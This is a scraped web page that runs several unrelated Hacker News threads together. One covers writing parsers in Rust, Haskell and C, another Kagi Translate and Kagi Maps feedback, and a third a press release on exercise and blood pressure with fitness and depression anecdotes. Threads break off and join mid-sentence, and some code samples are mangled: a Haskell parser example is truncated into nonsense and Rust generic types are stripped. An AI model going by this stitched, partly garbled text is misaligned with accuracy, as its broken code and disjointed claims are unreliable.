Rust for two companies now If you don't mind me asking, which companies?

Or how do you get into this industry within an industry? I'd really love to work on some programming language implementations professionally (although maybe that's just because I've built them non-professionally until now), You do not need to write programming languages to need parsers and lexers. My last company was Prisma (https://prisma.io) where we had our own schema definition language, which needed a parser. The first implementation was nested structures and reference counting, which was very buggy and hard to fix. We rewrote it with the index/walker strategy described in my previous comment and got a significant speed boost and the whole codebase became much more stable. The company I'm working for now is called Grafbase (https://grafbase.com). We aim to be the fastest GraphQL federation platform, which we are in many cases already due to the same design principles. We need to be able to parse GraphQL schemas, and one of our devs wrote a pretty fast library for that (also uses Logos): https://crates.io/crates/cynic-parser And we also need to parse and plan the operation for every request. Here, again, the ID-based model works miracles. It's fast and easy to work with. > I really like the sound of this, it wasn't necessarily confusing to work with Rc and Weak but more I had to put in a lot of extra thought up front (which is also valuable don't get me wrong). These are suddenly _very annoying_ to work with. If you come from the `Weak` side to a model, you need to upgrade it first (and unwrap), which makes passing references either hard or impossible depending on what you want to do. It's also not great for CPU caches if your data is too nested. Keep everything flat and sorted. In the beginning it's a bit more work and thinking, but it scales much better when your project grows. > Thanks! Maybe then the Rust code I have so far won't be thrown in the bin just yet.

All the popular Rust parsing libraries aren't even focused on the use that most people use \"parser\" to name. They can't support language-parsing at all, but you only discover that after you spent weeks fighting with the type-system to get to the real PL problems.

Looking at Primeys' comment he actually gave some really interesting suggestions on how to manage this without needing Rc / weak pointers or copying loads of dynamic memory all over the place.

Do you see an obvious reason why a similar approach won't work in Rust? E.g. winnow [1] seems to offer declarative enough style, and there are several more parser combinator libraries in Rust.

Most Haskell code is simple and legible if you know enough Haskell to read it, but Haskell isn't exactly a simple or legible language. Haskell demonstrates the use of parser combinators very well, but I'd still use parser combinators in another language. Parser combinators are implemented in plenty of languages, including Rust, and actually doing anything with the parsed output becomes a lot easier once you leave the Haskell domain. reply kreetx 4 hours agorootparentI'd say Haskell is even simpler than Rust: the syntactic sugar of monads/do-notation makes writing parsers easy. The same sugar transfers to most other problem domains. reply orf 10 hours agorootparentprevThe nom crate has an RGB parser example: https://docs.rs/nom/latest/nom/#example It’s slightly longer, but more legible. reply mrkeen 11 hours agorootparentprevBut it doesn't take much to go from 0 to a parser combinator library. I roll my own each year for advent of code. It starts at like 100 lines of code (which practically writes itself - very hard to stray outside of what the types enforce) and I grow it a bit over the month when I find missing niceties. reply lynx23 12 hours agoparentprevI wouldn't consider FEN a great parsing example, simply because it can be implement in a simple function with a single loop. Just a few days ago, I wrote a FEN \"parser\" for an experimental quad-bitboard impelementation. It almost wrote itself. P.S.: I am the author of chessIO on Hackage reply gritzko 11 hours agoprevI have the experience of writing parsers (lexers) in Ragel, using Go, Java C++, and C. I must say, once you have some boilerplate generator in place, raw C is as good as the Rust code the author describes. Maybe even better because simplicity. For example, this is the most of code necessary to have a JSON parser: https://github.com/gritzko/librdx/blob/master/JSON.lex In fact, that eBNF only produces the lexer. The parser part is not that impressive either, 120 LoC and quite repetitive https://github.com/gritzko/librdx/blob/master/JSON.c So, I believe, a parser infrastructure evolves till it only needs eBNF to make a parser. That is the saturation point. reply dvdkon 10 hours agoparentThat repetitivness can be seen as a downside, not a virtue. And I feel that Rust's ADTs make working with the resulting syntax tree much easier. Though I agree that a little code generation and/or macro magic can make C significantly more workable. reply djoldman 7 hours agoparentprevI love love love ragel. Won't the code here: https://github.com/gritzko/librdx/blob/master/JSON.lex accept \"[\" as valid json? delimiter = OpenObjectCloseObjectOpenArrayCloseArrayCommaColon; primitive = NumberStringLiteral; JSON = ws* ( primitive? ( ws* delimiter ws* primitive? )* ) ws*; Root = JSON; (pick zero of everything in JSON except one delimiter...) I usually begin with the RFCs: https://datatracker.ietf.org/doc/html/rfc4627#autoid-3 I'm not sure one can implement JSON with ragel... I believe ragel can only handle regular languages and JSON is context free. reply gritzko 2 hours agorootparentThat is a lexer, so yes, it accepts almost any sequence of valid tokens. Pure Ragel only parses regular languages, but there are ways. reply tptacek 15 hours agoprevSo, just to kick this off: I wrote an eBPF disassembler and (half-hearted) emulator in Rust and I also found it a pleasant language to do parsing-type stuff in. But: I think the author cuts against their argument when they manage to necessitate a macro less than 1/6th of the way into their case study. A macro isn't quite code-gen, but it also doesn't quite feel like working idiomatically within the language, either. Again: not throwing shade. I think this is a place where Rust is genuinely quite strong. reply thesz 14 hours agoparentHow can one define an infinite grammar in Rust? E.g., a context-free rule S ::= abc|aabbcc|aaabbbccc|... can effectively parse a^Nb^Nc^N which is an example of context-sensitive grammar. This is a simple example, but something like that can be seen in practice. One example is when language allows definition of operators. So, how does Rust handle that? reply ryandv 13 hours agorootparentIn Haskell I think it's something like: {-# LANGUAGE OverloadedStrings #-} import Data.Attoparsec.Text import qualified Data.Text as T type ParseError = String csgParse :: T.Text -> Either ParseError Int csgParse = eitherResult . parse parser where parser = do ascsgParse \"aaabbbccc\" Right 3 reply thesz 4 hours agorootparentThe question comes from Haskell, yes: https://byorgey.wordpress.com/2012/01/05/parsing-context-sen... You used monadic parser, monadic parsers are known to be able to parse context-sensitive grammars. But, they hide the fact that they are combiinators, implemented with closures beneath them. For example, that \"count n $ char 'b'\" can be as complex as parsing a set of statements containing expressions with an operator specified (symbol, fixity, precedence) earlier in code. In Haskell, it is easy - parameterize your expression grammar with operators, apply them, parse text. This will work even with Applicative parsers, even unextended. But in Rust? I haven't seen how it can be done. reply jeroenhd 10 hours agorootparentprevUsing parser combinator library \"nom\", this should probably do what you'd want: fn parse_abc(input: &str, n: usize) -> IResult, Vec, Vec)> { let (input, result) = tuple(( many_m_n(n, n, char('a')),many_m_n(n, n, char('b')),many_m_n(n, n, char('c')) ))(input)?; Ok((input, result)) } It parses (the beginning of) the input, ensuring `n` repetitions of 'a', 'b', and 'c'. Parse errors are reported through the return type, and the remaining characters are returned for the application to deal with as it sees fit. https://play.rust-lang.org/?version=stable&mode=debug&editio... reply oguz-ismail 9 hours agorootparent> this should probably do what you'd want If you have to specify N, no, it doesn't reply jamra 15 hours agoparentprevLink us your eBPF disassembler if you can.

Educational and elegant approach. https://www.youtube.com/watch?v=HxaD_trXwRE reply emmanueloga_ 13 hours agoparentThat talk is great, but I remember some discussion later about Go actually NOT using this technique because of goroutine scheduling overhead and/or inefficient memory allocation patterns? The best discussion I could find is [1]. Another great talk about making efficient lexers and parsers is Andrew Kelley's \"Practical Data Oriented Design\" [2]. Summary: \"it explains various strategies one can use to reduce memory footprint of programs while also making the program cache friendly which increase throughput\". -- 1: https://news.ycombinator.com/item?id=31649617 2: https://www.youtube.com/watch?v=IroPQ150F6c reply chubot 13 hours agorootparentYeah I actually remember that too, this article mentions it: Coroutines for Go - https://research.swtch.com/coro The parallelism provided by the goroutines caused races and eventually led to abandoning the design in favor of the lexer storing state in an object, which was a more faithful simulation of a coroutine. Proper coroutines would have avoided the races and been more efficient than goroutines. reply tptacek 13 hours agoparentprevI feel like that talk has more to do with expressing concurrency, in problems where concurrency is a natural thing to think about, than it does with lexing. reply samsartor 1 hour agoprevImperative rust is really good for parsing, but you can also get a long way with regexes. Especially if you are just prototyping or doing Advent of Code. I do still like declarative parsing over imperative, so I wrote https://docs.rs/inpt on top of the regex crate.

Exact same library! Just with fewer String and more &'static str. So toying around with compilers translates my skill-set rather well into doing embedded protocol parsers. reply nhatcher 9 hours agoprevWell good luck parsing sqlite syntax! I had to write a (fairly small) subset sqlite parser for work a couple of years ago. I really like sqlite, it's always a source of inspiration. The railroad diagrams are tremendously useful: https://www.sqlite.org/syntaxdiagrams.html I don't think the lemon parser generator gets enough credit: https://sqlite.org/src/doc/trunk/doc/lemon.html With respect of the choice of the language, any language with Algebraic Data Types would work great. Even Typescript would be great for this.

I’m imagining seeing the node! macro used, and seeing the macro definition, but still having a tough time knowing exactly what code is produced. Do I just use the Example and see what type hints I get from it? Can I hover over it in my IDE and see an expanded version? Do I need to reference the compiled code to be sure? (I do all my work in JS/TS so I don’t touch any macros; just curious about the workflow here!) reply schneems 14 hours agoparentRun: $ cargo expand And you’ll see the resulting code. Rust is really several languages, ”vanilla” rust, declarative macros and proc macros. Each have a slightly different capability set and different dialect. You get used to working with each in turn over time. Also unit tests is generally a good playground area to understand the impacts of modifying a macro. reply guitarbill 13 hours agoparentprevrust-analyzer, the Rust LSP used in e.g. VSCode, can expand declarative and proc macros recursively. it isn't too bad, although the fewer proc macros in a code base, the better. declarative macros are slightly easier to grok, but much easier to maintain and test. (i feel the same way about opaque codegen in other languages.) reply WiSaGaN 14 hours agoprevI think except macros, most of these features are ML family language features as well.

I tried to make a tree-sitter grammar, which produces C code and great Rust bindings for it. But they use some lemon parser. Not sure how to read the grammar from that. reply mingodad 11 hours agoparentThe lemon tool that is used by SQLite can output the grammar as SQL database that you can manipulate. There is https://github.com/ricomariani/CG-SQL-author that goes way beyond and you'll need to create the Rust generation, you can play with it here with a Lua backend https://mingodad.github.io/CG-SQL-Lua-playground/ . Also I'm collecting several LALR(1) grammars here https://mingodad.github.io/parsertl-playground/playground/ that is an Yacc/Lex compatible online editor/interpreter that can generate EBNF for railroad diagram, SQL, C++ from the grammars, select \"SQLite3 parser (partially working)\" from \"Examples\" then click \"Parse\" to see the parse tree for the content in \"Input source\". I also created https://mingodad.github.io/plgh/json2ebnf.html to have a unified view of tree-sitter grammars and https://mingodad.github.io/lua-wasm-playground/ where there is an Lua script to generate an alternative EBNF to write tree-sitter grammars that can later be converted to the standard \"grammar.js\". reply rstuart4133 13 hours agoparentprevNot EBNF or anything standard, but possibly readable enough. It is an LR(1) grammar that has tested on all the test cases in Sqlite's test suite at the time: https://lrparsing.sourceforge.net/doc/examples/lrparsing-sql... The grammer contains things you won't have seen before, like Prio(). Think of them as macros. It all gets translated to LR(1) productions which you can ask it to print out. LR(1) productions are simpler than EBNF. They look like: symbol1 := symbol2 symbol3 symbol1 := symbol4 symbol3 symbol3 := token1 symbol2 token2 ... Documentation on what the macros do, and how to get it to spit out the LR1(1) productions is here: https://lrparsing.sourceforge.net/doc/html/ It was used to do a similar task the OP is attempting. reply jamra 2 hours agorootparentThis is great.

This proposes to provide the syntax and other features needed to grant (a subset of the future) C++ the same safety properties as safe Rust via an equivalent mechanism (a borrow checker for C++ and the lifetime annotations to drive it, the destructive move, the nominative typing and so on). Much as you might anticipate (although perhaps its designer Sean Baxter did not) this was not kindly looked upon by many C++ programmers and members of WG21 (the C++ committee) The larger thing that \"Safe C++\" and the reaction to it misses is that Rust's boon is its Culture. The \"Safe C++\" proposal gives C++ a potential safety technology but does not and cannot gift it the accompanying Safety Culture. Government programmes to demand safety will be most effective - just as with other types of safety - if they deliver an improved culture not just technological change. reply whytevuhuni 1 hour agorootparent [–] That sounds significantly more like C++ trying to be a dialect of Rust, rather than the other way around. I don't think that was the GGP's main gripe. But more importantly, Safe C++ is just not a thing yet. People seem to discount the herculean effort that was required to properly implement the borrow checker, the thousands of little problems that needed to be solved for it to be sound, not to mention a few really, really hard problems, like variance, lifetimes in higher-kinded trait bounds, generic associated types, and how lifetimes interact with a Hindley-Milner type system in general. Not trying to discount Safe C++'s efforts of course. I really hope they, too, succeed. I also hope they manage to find a syntax that's less... what it is now. reply Consider applying for YC's W25 batch! Applications are open till Nov 12.

Google Translate misunderstands this as \"encountering a second page load multiple times\" while DeepL and Kagi both get it right with \"encountering page loads of multiple seconds\" (with DeepL choosing a slightly more idiomatic wording) reply burkaman 22 hours agoparentprevThis is the link they gave for feedback: https://kagifeedback.org/d/5305-kagi-translate-feedback/4 reply epoxia 22 hours agoparentprevI asked some inappropriate things and it was \"translated\" to I cannot assist with that request. It definitely needs to be more clear when it's refusing to translate.

Why should I be \"forbidden\" from understanding a text written in a foreign language if it contains something inappropriate? I don't know of any translation service that does censorship. Not even Google does it and Kagi was supposed to be less user hostile than Google, not more. reply kmonsen 18 hours agoparentprevThis is kind of natural for a new service, one of the advantages the big players have is a giant test corpus. For less mainstream languages and terms it will be more noticeable. reply FurkanKambay 20 hours agoparentprev\"The game is my poem\" when back-translated from the Turkish translation, \"oyun benim şiirimdir\". And there's censorship too when doing EN-TR for a few other profanities I tested. When you add another particular word to the sentence, it outputs \"play with my cat, dad\". reply dlkmp 22 hours agoprevJust as a quick usability feedback: As long as Deepl translates asynchronously as I type, while Kagi requires a full form send & page refresh, I am not inclined to switch (translation quality is also already too good for my language pairs to consider switching for minor improvements, but the usability/ speed is the real feature here). This is coming from a user with existing Kagi Ultimate subscription, so I'm generally very open to adopt another tool if it fits my needs). Slightly offtopic, slight related: As already mentioned the last time Kagi hit the HN front page when I saw it: the best improvement I could envision for kagi is improved search performance (page speed). I still encounter multiple second page loads far too frequently that I didn't notice with other search engines. reply Aachen 22 hours agoparentInteresting, I'm actually annoyed that DeepL sends every keystroke and I'm using idk how many resources on their end when I'm just interested in the result at the end and for DeepL to receive the final version I want to share with them That it's fast, you don't have to wait much between finishing typing and the result being ready, that's great and probably better than any form system is likely to be. But if it could be a simple enter press and then async loading the result, that sounds great to me reply freediver 22 hours agoparentprev> As long as Deepl translates asynchronously as I type, while Kagi requires a full form send & page refresh, This leads to increased cost and we wanted to keep service free.

Maps for example is basically unusable and has been for a while. (at least in Germany) Trying to search for an address often leads Kagi maps to go to a different random address. Still love the search, but Id love for Kagi to concentrate on one thing at a time. reply freediver 21 hours agoparentWe are focusing most our resources on search (which I hope you can agree, we are doing a pretty good job at). And it turns out search is not enough and you need other things - like maps (or a browser, because some browsers will not let you change search engine and our paid users can not use the service). Both are also incredibly hard to do right. If it appears quarter-baked (and I am first to say that we can and will definetely keep imporivng improving with our products), it is not for the lack of trying or ambition but the lack of resources. Kagi is 100% user-funded. So we need users, and we sometimes work on tools that do not bring us money directly, but bring us users (like Small Web, Universal Summarizer or Translate). It is all part of the plan. And it is a decade-long plan. reply erinnh 19 hours agorootparentI absolutely did not mean to imply that you did not want to improve the products. I did assume that you are missing the resources for the many products you develop. Its just very sad to show/recommend Kagi to people and then have them(or me) run into so many bugs, and sometimes product-breaking bugs. (such as Maps that I mentioned. because I would love to use Kagi maps, but its so broken that I just cant) Would love to travel 10 years into the future of Kagi's roadmap. reply ryanisnan 19 hours agorootparentprevYou do not need your own browser. Keep Firefox alive. reply haarolean 13 hours agorootparentMozilla is digging a grave for Firefox with its own hands, we need something else non-chromium, which Orion serves fine.

The web does not need more ad-supported browsers. Orion is built for the users and paid for by the users.

We need more of Orion today, and more than ever. reply ryanisnan 1 hour agorootparentI think the community needs more browser options, sure, but I don't understand why Kagi needs Orion. It seems like a distraction to your core competencies. I'm curious if the writing is on the wall for search alone? reply hedora 19 hours agorootparentprevThank you for making Firefox plugins available for iOS. I pay for search, but not Orion. I assume you see that much of my paid Kagi search traffic comes from Orion, and put money into appropriate buckets. reply lurking_swe 17 hours agorootparentprevlove the plan, but i’d suggest being more up front with users on how “finished” a product is. With the maps example, you run into problems because of expectations. If you slap a BETA or ALPHA logo on the maps product, expectations will be lower, and people are more forgiving of issues while you continue improving the product. Or if it’s only good in the US (just an example), make it clear somehow when searching for addresses outside the US. Just my 2 cents as a paying Kagi customer. reply freediver 17 hours agorootparentInterestingly we do not get a lot of bug reports for Maps on our feedback forum. And this is where we tend to go to look for problems to fix. reply laserbeam 14 hours agorootparentAs a kagi early adopter… why would I bug report on a feature I actively avoid using? I can totally recommend search to anyone, but I agree with others in this chat that most toys feel beta. I’m glad to have them but can’t recommend them. For maps, your goals of being ad free go against what I need from maps search. 90% of the time I search for restaurants, museums, businesses, opening hours, phone numbers of various local shops. People add that data to google, and not that many other maps services :(. That is where they advertise how to be contacted. Addresses and directions are really secondary to a maps search. reply esperent 14 hours agorootparentprevAs a paid kagi user, that might be because I tried kagi maps once, went \"yep that's crap\" and from then on went to Google for any maps related search. However, I neither expect nor need kagi to have a perfect replacement for every single google product. I'd rather it focus on creating better versions of the things that google is bad at (especially basic search) rather than trying to provide bad versions of the things Google is good at (maps, translate). reply Martinussen 10 hours agorootparentprevAs an anecdatapoint, I have replaced the button with a redirect to Google maps. It's not worth trying to extract value from the Kagi one, I probably gave it a chance ~20 times and I don't think it did what I needed a single one. (In Scandinavia) reply dgacmu 16 hours agorootparentprevAs a paying Kagi user, in my case, that's because I !g any query that I expect to give local results for, and I often go directly to maps.google.com for map results. The general search results are awesome, particularly in my tech bubble, since I don't have to see w3schools garbage and the like. Localized stuff, not so great, and maps I prefer to avoid. (Edited to add: Though perhaps I should give maps a try again. They seem to have gotten better since I formed my muscle memory.) reply carlosjobim 7 hours agorootparentprevLike others here are saying, Kagi maps is so far behind that I wouldn't bother with any bug reports or feedback. I tried it just now, was panning around in a region in Europe, clicked the \"Hotels\" button to see what it would present and get sent to a town called Hotels in Palestina with a Wikipedia description of what a hotel is... So the suggestion to slap a beta sticker over maps is a good one. Nokia, Microsoft and Apple have all tried to compete with Google Maps without succeeding. Do yourself a favour and start using the Google Maps API for Kagi Maps, that's probably the only way you can get all the important data. If the API is expensive, then charge more for maps. Kagi customers want the best product, and are willing to pay for it. reply Aachen 21 hours agoparentprevWhere do I find the map feature? I'm curious to see if I can identify what data source and search software it is based on, since I've heard similar complaints about Nominatim and it is indeed finicky if you made a typo or don't know the exact address; it does no context search based on the current view afaik. Google really does do search well compared to the open source software I'm partial to, I gotta give them that Edit: ah if you horizontally scroll on the homepage there's a \"search maps\" thing. Putting in a street name near me that's unique in the world, it comes up with a lookalike name in another country. Definitely not any OpenStreetMap-based product I know of then, they usually aren't unliteral like that.

In several attempts, they would translate the word to an equivalent of \"internal organs\" even though the German word is, unlike the English \"organ\", unambiguous.

I have some experience experimenting in this space; it's not actually that hard to build a model which surpasses DeepL, and the wide language support is just a consequence of using an LLM trained on the whole Internet, so the model picks up the ability to use a bunch of languages. reply ilaksh 21 hours agorootparentI'm almost sure they did not find tune an LLM. They are using existing LLMs because fine tuning to best the SOTA models at translation is impractical unless you target very niche languages and even then it would be very hard to get a better dataset than what is already used for those models. Probably all they are doing is like switching between some Qwen model (for Chinese) and large Llama or maybe OpenAI or Gemini. So they just have a step (maybe also an LLM) to guess which model is best or needed for the input. Maybe something really short and simple just goes to a smaller simpler less expensive model. reply freediver 22 hours agoparentprevIt uses a combination of LLMs, selecting the best output.

Thanks for obliging my curiosity :) reply freedomben 22 hours agorootparentprevIndeed, that's what would make most sense to me. I also strongly suspect the way they're able to make it free is by caching the results, so each translation only happens one time regardless of how many requests for the page happen. If they translated dynamic content, they couldn't (safely) cache the results. reply kevincox 22 hours agorootparentI don't think JS vs HTML would make any difference to caching. If they are caching by URL you can have dynamic HTML generation or a JS generated page that is the same on every load. If you are caching by the text then you can do the same for HTML or JS generated (you are just reading the text out of the DOM when the JS seems done). reply freedomben 4 hours agorootparentYeah, js can be static or dynamic, so its not just whether it's js that matters. It's whether the content is added or modified after initial rendering that makes it dynamic. Most js heavy pages retrieve data from APIs, and the static parts of the code is just layout and menus, which isn't the part that people care most about translating. Thus why GP said \"added via Javascript later.\" The important part of that isn't the \"Javascript\" , it's the \"later.\" reply ks2048 22 hours agorootparentprevAh, that makes sense. In my head it sounded like server-side dynamic content OR not wanting to translate LLM outputs, neither of which makes sense or is possible. reply _kidlike 22 hours agorootparentprevthat's what I think too, which kinda makes sense since it's a page, and not a browser plugin.

New research suggests that adding a small amount of physical activity – such as uphill walking or stair-climbing – into your day may help to lower blood pressure. The study, published in Circulation, was carried out by experts from the ProPASS (Prospective Physical Activity, Sitting and Sleep) Consortium, an international academic collaboration led by the University of Sydney and University College London (UCL). Just five minutes of activity a day was estimated to potentially reduce blood pressure, while replacing sedentary behaviours with 20-27 minutes of exercise per day, including uphill walking, stair-climbing, running and cycling, was also estimated to lead to a clinically meaningful reduction in blood pressure. Joint senior author Professor Emmanuel Stamatakis, Director of the ProPASS Consortium from the Charles Perkins Centre said: “High blood pressure is one of the biggest health issues globally, but unlike some major causes of cardiovascular mortality there may be relatively accessible ways to tackle the problem in addition to medication.” “The finding that doing as little as five extra minutes of exercise per day could be associated with measurably lower blood pressure readings emphasises how powerful short bouts of higher intensity movement could be for blood pressure management.” Hypertension, or a consistent elevated blood pressure level, is one of the biggest causes of premature death globally. Affecting 1.28 billion adults around the world, it can lead to stroke, heart attack, heart failure, kidney damage and many other health problems, and is often described as the ‘silent killer’ due to its lack of symptoms. The research team analysed health data from 14,761 volunteers in five countries to see how replacing one type of movement behaviour with another across the day is associated with blood pressure. Each participant used a wearable accelerometer device on their thigh to measure their activity and blood pressure throughout the day and night. Daily activity was split into six categories: sleep, sedentary behaviour (such as sitting), slow walking, fast walking, standing, and more vigorous exercise such as running, cycling or stair climbing. The team modelled statistically what would happen if an individual changed various amounts of one behaviour for another in order to estimate the effect on blood pressure for each scenario and found that replacing sedentary behaviour with 20-27 minutes of exercise per day could potentially reduce cardiovascular disease by up to 28 percent at a population level. First author Dr Jo Blodgett from the Division of Surgery and Interventional Science at UCL and the Institute of Sport, Exercise and Health said: “Our findings suggest that, for most people, exercise is key to reducing blood pressure, rather than less strenuous forms of movement such as walking. “The good news is that whatever your physical ability, it doesn’t take long to have a positive effect on blood pressure. What’s unique about our exercise variable is that it includes all exercise-like activities, from running for a bus or a short cycling errand, many of which can be integrated into daily routines. “For those who don’t do a lot of exercise, walking did still have some positive benefits for blood pressure. But if you want to change your blood pressure, putting more demand on the cardiovascular system through exercise will have the greatest effect.” Professor Mark Hamer, joint senior author of the study and ProPASS Deputy Director from UCL, said: “Our findings show how powerful research platforms like the ProPASS consortium are for identifying relatively subtle patterns of exercise, sleep, and sedentary behaviour, that have significant clinical and public health importance.” Research Blodgett, J., Stamatakis, E., Hamer, M., et al, ‘Device-measured 24-hour movement behaviours and blood pressure: a six-part compositional individual participant data analysis in the ProPASS Consortium’ (Circulation, 2024) DOI: 10.1161/CIRCULATIONAHA.124.069820 Declaration Professor Emmanuel Stamatakis is a paid consultant and holds equity in Complement Theory Inc, a US-based startup whose products and services relate to the contents of this article.

I generally believe that brief bouts of exercise can be very beneficial, especially because they're easier to do consistently over the long-term vs. more time-consuming routines. For a decade now, I've just been running through my neighborhood most days for 20-30 minutes (with some sprints mixed in) and doing one or two maximal sets of pushups or pullups or barbell exercises at home on a weekly basis. I know a lot of people who got really into longer (e.g. 60-90 minute) gym routines but couldn't sustain it for more than a few months, and then stopped doing anything.

Basically any time we do a study which asks \"Is doing a bit more exercise better for you?\" the answer is yes. Like doing a single walk around the block every week is better than doing none. Even five minutes of exercise is better than zero. But obviously these have much less positive impact than several hours of moderate to intense exercise weekly. There are diminishing returns but they don't really kick in until you're already pretty fit, they are only really a concern that athletes need to think about. So in terms of individual decision making things are really simple. Are you not fit? Do you feel bad? Are your basic markers for this looking bad (blood pressure, weight etc.)? Do more exercise. Do what you enjoy, do it safely, and do as much of it as you can as intensely as is reasonable, and the numbers will go in the right direction. This will put you way ahead of the average American in terms of fitness, it's not until a higher level that things really start to get technical. reply kd5bjo 6 hours agorootparent> There are diminishing returns but they don't really kick in until you're already pretty fit, they are only really a concern that athletes need to think about.

It's often not solved by exercising alone, and if you talk to a psychologist about this, the first thing they do is recommend exercising or at least goeing for walks as an immediate measure before potentially therapy or medication starts. When I went to a doctor complaining about low energy, literally the first question was about weight gain and exercising, so I'm not sure where your comment about the pills comes from. reply sfn42 6 minutes agorootparentMost people don't know what depression is. I'd say I've been depressed most of my life but the best periods have been the ones where I was physically active. Now, there's a bit of a chicken and egg problem here -am I sedentary because I'm depressed or am I depressed because I'm sedentary? I would agree with the previous poster that exercise brings me out of depression, but I spend most of my depressive periods thinking I should be more active, right now I'm in one and I keep trying to get into some healthy habits but I keep giving up because I just don't have whatever it is that I need to keep it going. I even get nearly immediate results, just a few weeks of activity has me feeling better already. But then I find some reason to take a break and then the break drags on and I'm back to where I started. So maybe it's the depression keeping me down or maybe it's my lack of discipline causing depression but either way I'd say physical activity is important for how you feel on a daily basis and I genuinely think just getting into a regular rhythm of exercise even just one day a week can have huge impacts on your life. reply renegade-otter 8 hours agorootparentprevMy comment comes from the seeming ease of procuring these drugs - with people going on Ozempic out of pure vanity. reply toofy 4 hours agorootparentyou did end your comment with: > The doctors rarely tell you to eat your salads. \"Here is a pill, thank you for your business\" which makes it appear as even with your “self-diagnoses” you’re under the impression that doctors rarely ask about exercise and diet and then move forward from there. which is the exact opposite of what i’ve seen from a college roommate, a close friend, and an ex who saw multiple different doctors, and each of those doctors first insisted on: a) find a hobby, dive into it. and, b) exercise multiple times per week. and, c) get a nutritionist. and d) only after those things showed little results would they prescribe SSRIs or other long term drugs. i promise this isn’t coming down on you, i promise, but, we seem to have a massive trend of confidently wrong people implying they’re smarter than actual doctors or (just about any other subject it seems), they just guess what doctors do and don’t do. and even far more concerning is how often these confidently wrong people issue blanket advice to randoms online as if they’re at all qualified and as if they know any of the important intricate details of the randoms they’re advising. we desperately need to get back to a place where people can confidently say “i don’t know” again. we’re (including myself) too desperate to chime in even if we’re woefully ill equipped. maybe every secondary-university semester everyone should get a refresher session on the most basic ass socrates/plato: the smartest person is the one who knows, understands, and admits about how much they are ignorant. reply petercooper 6 hours agorootparentprevI do wonder how many people do not take care of the basics and instead go for anti-depressants and Ozempic. Bear in mind that for many people therapies like SSRIs and weight loss medications (or even counselling/therapy) can get them into the right mental and physical place to start doing more exercise and eat better. It's easy to advise people to eat well and exercise, but it can be a bit like telling a miserable person with a migraine to smile more. Improve the underlying issue artifically, then they can have a better chance of starting the natural things. Doctors do need to do both, though, merely handing out medications without encouraging the next step is irresponsible IMO. reply hunter-gatherer 5 hours agorootparentI've never suffered from a mental illness, so I'm genuinely curious; is exercise not ever used as a prescription for depression? Physical therapy is a thing, so it can be a prescription in some cases, no? reply petercooper 4 hours agorootparentOh, it absolutely is, and from what I've read, it can work really well! It's just not necessarily a 'one size fits all' which is what makes medicine complicated and good doctors valuable. If someone's hit the point where they're thinking \"I'd rather be dead than leave the house\", improving their mental health by any means necessary should be the first step. But not everyone should be given pills as the first option and many doctors are guilty of such laziness (over prescription of opioids and antibiotics are other examples of this – some patients urgently need them, most don't). reply dspillett 8 hours agorootparentprev> The doctors rarely tell you to eat your salads. \"Here is a pill, thank you for your business\". I'm guessing you are in the US? There is a lot of medical advice here (UK, and Europe more widely) which is essentially “eat better and move around more”. A great many don't listen to that, but it is definitely said. > When I stop compulsively eating and drinking [and do some] exercise This is a key issue: not what doctors are prescribing but what people do to self-medicate. The harmful side of self-care when “a bit of what you like does you good” becomes overconsumption and underactivity. It can be even worse for those of us with significant mental issues over the norm (bit of a bipolar pillock myself, got a piece of paper saying so & everything, and like you describe with depression I find the right exercise, while not at all a panacea, helps regulate my mind quite a lot as well as stopping my body falling apart). reply bobthepanda 9 hours agorootparentprev?

Huge guy. Former NFL tight-end. Still very fit. I notice he only does 1 hour at the gym and then he leaves. Granted, this is very low quality anecdata. But seeing how brief his workout is opened my eyes to the benefit of consistency over volume. reply safety1st 7 hours agorootparentI wish someone had told me this: once you put muscle on your frame it tends to stick around. If you bulk up and turn into Hercules over the course of a few years you can scale back your training volume dramatically and as long as you keep your diet right, you will continue to be a jacked and cut dude for many many years. I'm sure this gets less true as you age but it seems to apply to me in my 40s. Maintenance is just way easier than the initial buildup. I discovered this pretty much on accident when I scaled back the volume and intensity of my own training and noticed... Huh would you look at that... Very little changed. Like on some level, it would be harder to return to the state of roly poly schlub that I was once in, than to continue being the fairly fit person I am now. I just autopilot twice a week to the gym after work, zone out and listen to podcasts for an hour while doing some pretty moderate intensity lifts, and the body stays in pretty decent shape. I barely break a sweat now compared to the first year or two. reply warner25 2 hours agorootparentYeah, I'm pretty sure that Shannon Sharpe was doing a lot more than one hour per day of training when he was playing competitively. It's my observation that two workouts or practices per day is typical for collegiate athletics, even in the sports and at the schools that don't bring in money. But after that? Yeah, no doubt that one can maintain most of that fitness with a small fraction of the time and effort. As I said up-thread, I started running as an Army cadet, and I've continued to take annual fitness tests throughout my career. The fastest guys on those tests are guys who (unsurprisingly) were serious runners or soccer players in high school / college but who (surprisingly) did very little running after that. They could jump into the test cold and laugh their way to two miles in 12:00 (11:00 if they were really trying). I, on the other hand, basically didn't start running until I joined the Army, and I had to put in a lot of miles to break 13:00. For several years after that, though, I was able to reduce my mileage too and still run circles around a lot of people. reply subsaharancoder 1 hour agorootparentprevHe is also 56 years old and has the muscle definition of a man in his 20s, when biology shows building and retaining that kind of quality muscle at that age is very difficult even with a history of physical fitness.

There is value is getting regimens and techniques from really experienced athletes. Edit: Also, I've been on a 4 day Bukgarian split before and had very good results. If you want proof there is a 30 minute routine that can kick your ass I recommend looking up Ryan Humiston's take on it. reply toss1 3 hours agorootparentprevUm, not really any reason to doubt as there's nothing wrong with selling what you find works Moreover, my experience in having formerly trained to compete at top international levels, studied exercise physiology and worked as a trainer, is very similar. The really short oversimplified version is: more intensity, shorter training, and more rest — it is the balance of exercise and rest that is key. And world-class results are definitely possible with relatively brief workouts; in fact, it's the best way to do it. The simplified concept is the muscles gain strength with stimulated rest. The training/exercise only provides the stimulus for the muscles to grow, the exercise does not actually grow the cells, it degrades or damages them. It is the repair process that strengthens the muscle. Too much exercise and too little rest (=repair+growth) just degrades the system; too much rest without exercise stimulus wastes potential growth time. Some is good, but more is not necessarily better. While there is no question that some exercise is almost always better than none, if you want peak results, intensity is the key. By intensity, we mean pushing the muscle to failure, so the end of each lifting set is not a predetermined number of reps, but the rep where you push as hard as possible and simply cannot complete the lift (after ~5-25 reps depending on focus on strength vs bulk, respectively). Do that one to three times for each muscle in the workout, then give it some days rest. A 45-min workout is sufficient to work the upper, mid, or lower body zone. Doing only one zone each day fits a max of six workouts per week, and monitoring vital signs (pulse/bp/temp) for overall stress will usually reduce that to around four weight workouts per week. This is what worked for me and the people I trained, and I'm not the least bit surprised to find it also worked for Dorian Yates (and no, I'm not selling anything related to exercise programs). reply blargey 17 hours agoparentprevNitpick: In Tabata's research, \"high 